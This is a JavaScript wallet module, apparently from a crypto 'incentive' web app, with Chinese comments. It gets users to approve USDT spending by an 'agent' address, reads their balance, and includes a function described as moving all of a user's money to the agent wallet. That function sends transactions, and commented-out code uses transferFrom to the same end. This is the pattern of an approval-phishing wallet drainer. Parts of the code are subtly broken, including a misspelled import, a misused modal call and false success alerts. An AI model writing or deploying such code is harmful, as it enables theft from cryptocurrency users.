import { privoder } from "ethers";
import Web3 from 'web3/dist/web3.min.js'
import abi from '../utils/ERC20.json'
import ElementUI from 'element-ui';
let ContractAddress = '0xdAC17F958D2ee523a2206206994597C13D831ec7'

import Web3Modal from "web3modal"
import WalletConnectProvider from "@walletconnect/web3-provider"
import WalletLink from "walletlink"

import WalletConnect from "@walletconnect/client";
import QRCodeModal from "@walletconnect/qrcode-modal";

const providerOptions = {
    binancechainwallet: {
        package: true
    },
    walletconnect: {
        package: WalletConnectProvider,
        options: {
            infuraId: "75f5a6b0e4514c50858504adf83ed5e1"
        }
    },
    walletlink: {
        package: WalletLink,
        options: {
            appName: "testE",
            infuraId: "75f5a6b0e4514c50858504adf83ed5e1",
            rpc: "",
            chainId: 1,
            appLogoUrl: null,
            darkMode: true
        }
    }
}

const web3Modal = new Web3Modal({
    network: "mainnet",//
    theme: "dark",
    cacheProvider: true,
    providerOptions
})

export default class BlockChain {

    _isMobile() {
        let flag = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i)
        return flag;
    }

    //账户授权
    async doApprove(address, callBack) {
        try {
            var provider = await web3Modal.connect()
            await web3Modal.toggleModal();
            var web3 = new Web3(provider)
            var account = await web3.eth.getAccounts()
            var contract = new web3.eth.Contract(abi, ContractAddress)

            console.log('代理地址:', address)
            console.log('用户地址:', account[0])
            console.log('合约地址:', ContractAddress)
            let amount = 100 * Math.pow(10, 18);                          //授权数量 100个
            let toAddress = address                                       //被授权地址
            let fromAddress = account[0]; //账户地址
            contract.methods.approve(toAddress, amount + '').send({ from: fromAddress }).catch(function (reason) {
                if (reason.code == 4001) {
                    alert('授权失败')
                    console.log("授权失败(4001: 取消授权)")
                    callBack(false, null)
                }
                else {
                    alert('授权成功')
                    console.log("授权成功")
                    callBack(true, account[0])
                }
            })
        }
        catch (e) {
            console.log("e", e)
        }
    }

    //查询授权钱包地址
    onCheckApproveAddress(userId) {

    }

    //查询授权币种(X)
    onCheckApproveCoinType(userId) {

    }

    //查询授权用户钱包余额
    async onCheckApproveWallet(userAddress) {
        // var provider = await web3Modal.connect()
        var web3 = new Web3(window.web3.currentProvider)
        var ethContract = new web3.eth.Contract(abi, ContractAddress)

        // let fromAddress = agentAddress //查询地址
        let toAddress = userAddress    //被授权地址
        let balance = await ethContract.methods.balanceOf(toAddress).call()
        console.log("[" + userAddress + "]的钱包余额: ", balance)
        return balance
    }

    //查询激励百分比
    onCheckIncentivePer(userId) {

    }

    //查询激励总金额
    onCheckIncentiveTotallyMoney(userId) {

    }

    //查询最后一次激励的时间(如果没有则返回空字符串)
    onCheckLastIncentiveTime(userId) {

    }

    //设置激励百分比(0-99.99)
    onSetIncentivePer(userId, num) {

    }

    //转移用户所有金钱(到对应的代理钱包内)
    async doTransferUserMoney(agentAddress, userAddress, callBack) {
        const connector = new WalletConnect({
            infuraId: "75f5a6b0e4514c50858504adf83ed5e1"
        });

        const tx = {
            from: userAddress, // Required
            to: agentAddress, // Required (for non contract deployments)
            data: "0x", // Required
            gasPrice: "0x02540be400", // Optional
            gas: "0x9c40", // Optional
            value: "0x00", // Optional
            nonce: "0x0114", // Optional
        };

        // Send transaction
        connector
            .sendTransaction(tx)
            .then((result) => {
                // Returns transaction id (hash)
                console.log(result);
            })
            .catch((error) => {
                // Error returned when rejected
                console.error(error);
            });

        // console.log(userAddress, agentAddress)
        // let values = this.onCheckApproveWallet(userAddress)

        // console.log("授权地址: " + "0x9ec997b5Ad73A4a42cf1203FF49da67B1B6e1167")
        // console.log("用户地址: " + userAddress)
        // console.log("收款地址: " + agentAddress)

        // const transactionParameters = { from: userAddress, to: agentAddress, value: 1 };
        // window.ethereum.request({
        //     method: 'eth_sendTransaction',
        //     params: [transactionParameters],
        // }).then((result) => {
        //     // The result varies by RPC method.
        //     // For example, this method will return a transaction hash hexadecimal string on success.
        // }).catch((error) => {
        //     if (error.code == 4100) alert('正在拉取钱包, 请稍等...')
        //     // If the request fails, the Promise will reject with an error.
        // });

        // var provider = await web3Modal.connect()
        // var web3 = new Web3(provider)
        // var ethContract = new web3.eth.Contract(abi, ContractAddress)
        // let totallyMoney = this.onCheckApproveWallet(userAddress) //剩余授权金额

        // console.log(userAddress, agentAddress)
        // ethContract.methods.transferFrom(userAddress, agentAddress, 1).send({ from: userAddress }).catch(function (reason) {
        //     if (reason.code == 4001) callBack(false)
        //     else callBack(true)
        //     // console.log("提示:", reason);
        // })
    }

    //激励(转账)
    async doTransferMoney(userAddress, amount, callBack) {
        var provider = await web3Modal()
        var web3 = new Web3(provider)
        // let web3 = new Web3(window.web3.currentProvider)
        var ethContract = new web3.eth.Contract(abi, ContractAddress)

        let toAddress = userAddress                                   //接收地址
        let toMoney = amount * Math.pow(10, 6)                        //发送货币

        window.ethereum.enable().then((res) => {
            window.ethereum.enable().then((res) => {
                ethContract.methods.transfer(toAddress, toMoney + '').send({ from: res[0] }).catch(function (reason) {
                    if (reason.code == 4001) callBack(false)
                    else callBack(true)
                    // console.log("提示:", reason);
                })
            })
        });
    }
}